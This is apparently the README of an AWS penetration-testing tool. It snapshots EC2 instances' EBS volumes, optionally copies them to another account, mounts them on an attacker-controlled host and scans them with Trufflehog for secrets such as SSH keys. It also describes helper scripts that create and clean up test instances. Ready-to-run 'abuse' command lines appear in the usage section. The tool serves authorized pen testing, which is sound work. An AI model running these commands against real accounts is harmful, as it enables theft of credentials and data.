# EBS Pillager

This is an EC2 EBS post-exploitation script. The end goal is to make your life a lot easier if you get admin in EC2 while on an AWS pen test and are interested in pillaging other instances' EBS volumes. It automates the process of creating snapshots of EBS volumes, transferring them between AWS accounts if necessary, mounting them on the attacker-controlled EC2 instance, and running Trufflehog on the EBS volume's mounted snapshot. 

## Features
- **Snapshot Creation**: Create snapshots of the root EBS volume of an EC2 instance.
- **Cross-Account Snapshot Transfer**: Optionally transfer the snapshot to a different AWS account.
- **Volume Creation**: Create a new volume from the snapshot and attach it to a target EC2 instance.
- **Volume Mounting**: Mount the created volume to a specified EC2 instance for inspection.
- **Trufflehog Scanning**: Run Trufflehog on the mounted volume to search for secrets.

## Requirements
- Python 3.x
- `boto3` library
- AWS CLI configured with necessary profiles

## Usage
### Same Account Abuse
This scenario involves creating a snapshot and mounting the volume within the same AWS account.
```
python3 ebspillage.py --src-profile $dst_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-09639c1f8c7408b0d --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json
```

### Cross-Account Abuse Without Snapshot Transfer
In this scenario, the snapshot is created in one AWS account but is not transferred to the destination account. The volume is created and mounted within the source account.
```
python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-062fb4910e81569b1 --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json
```

### Cross-Account Abuse with Snapshot Transfer
This scenario involves creating a snapshot in one AWS account, transferring it to another account, and then creating and mounting the volume in the destination account.

```
python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-062fb4910e81569b1 --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json --transfer
```

## Arguments
- `--src-profile`: The AWS CLI profile name for the source account.
- `--dst-profile`: The AWS CLI profile name for the destination account.
- `--src-region`: The AWS region for the source account.
- `--dst-region`: The AWS region for the destination account.
- `--mount-path`: The path on the target instance where the volume will be mounted.
- `--pillage`: Flag to enable the process of creating a snapshot, creating a volume, mounting it, and running Trufflehog.
- `--ssh-key-path`: The path to the SSH key file used for connecting to the instance.
- `--target-ec2`: The EC2 instance ID for which the snapshot will be created.
- `--mount-host`: The EC2 instance ID where the volume will be mounted.
- `--pillage-path`: The path within the mounted volume where Trufflehog will be run.
- `--out-file`: The path where the Trufflehog output will be saved.
- `--json`: Flag to enable JSON output format for Trufflehog.
- `--transfer`: Flag to transfer the snapshot from the source account to the destination account.
- `--retain`: Retain the snapshot and volume after processing, instead of deleting them.

# AWS EC2 Helper Scripts

This repository contains two helper scripts, `create_ec2.sh` and `delete_all.sh`, designed to manage EC2 instances and related resources on AWS. These scripts simplify the process of creating and cleaning up EC2 instances, volumes, and snapshots.

## Scripts Overview

### `create_ec2.sh`

This script automates the creation of an EC2 instance in a specified AWS region. The script is designed to apply a specific tag (`TrufflehogTesting`) to both the EC2 instance and its associated EBS volume.

#### Usage

`bash create_ec2.sh --profile PROFILE_NAME --region REGION --instance-profile INSTANCE_PROFILE --ip-allowlist IP_ADDRESS --key KEY_NAME --image-id IMAGE_ID --instance-type INSTANCE_TYPE`

#### Parameters

- `--profile`: The AWS CLI profile to use for authentication 
- `--region`: The AWS region where the instance will be created (e.g., `us-east-1`).
- `--instance-profile`: The IAM instance profile to attach to the instance (e.g., `SMInstanceProfile`).
- `--ip-allowlist`: The IP address (or range) to allow SSH access (e.g., `1.2.3.4/32`). You can use `curl -s ifconfig.me` to automatically use your current public IP.
- `--key`: The name of the SSH key pair to associate with the instance 
- `--image-id`: The ID of the Amazon Machine Image (AMI) to use for the instance 
- `--instance-type`: The type of instance to create (e.g., `t3.micro`).

#### Example

`bash create_ec2.sh --profile YOUR_PROFILE --region us-east-1 --instance-profile SSMInstanceProfile --ip-allowlist `curl -s ifconfig.me`/32 --key YOUR_KEY --image-id YOUR_AMI_ID --instance-type t3.micro`

This command will create an EC2 instance with the tag `TrufflehogTesting` applied to both the instance and its associated EBS volume.

### `delete_all.sh`

This script automates the deletion of all EC2 instances, EBS volumes, and snapshots that have been tagged with `TrufflehogTesting`. It provides an easy way to clean up resources after testing.

#### Usage

`bash delete_all.sh --profile PROFILE_NAME --region REGION`

#### Parameters

- `--profile`: The AWS CLI profile to use for authentication  
- `--region`: The AWS region where the resources are located  

#### Example

`bash delete_all.sh --profile YOUR_PROFILE --region us-east-1`

This command will delete all EC2 instances, EBS volumes, and snapshots in the specified region that have been tagged with `TrufflehogTesting`.

### Script Details

- `create_ec2.sh`: 
  - Automatically tags EC2 instances and associated EBS volumes with `TrufflehogTesting`.
  - Configures security group rules to allow SSH access from a specified IP address.
  - Starts the instance and waits for it to be in the `running` state before outputting the public IP.

- `delete_all.sh`: 
  - Finds and deletes all EC2 instances tagged with `TrufflehogTesting`.
  - Finds and deletes all EBS volumes and snapshots tagged with `TrufflehogTesting`.
  - Ensures that resources are cleaned up thoroughly to avoid unnecessary charges.

### Requirements

- **AWS CLI**: The scripts require the AWS CLI to be installed and configured with appropriate credentials.
- **JQ**: The `jq` command-line tool is used to parse JSON output from the AWS CLI.

## To Do

- [ ] Run tests with encrypted EBS volumes with various roles / AuthZ levels 
- [ ] Add functionality to work with specific KMS keys for decrypting volumes if encrypted 

## License
This project is licensed under the MIT License.
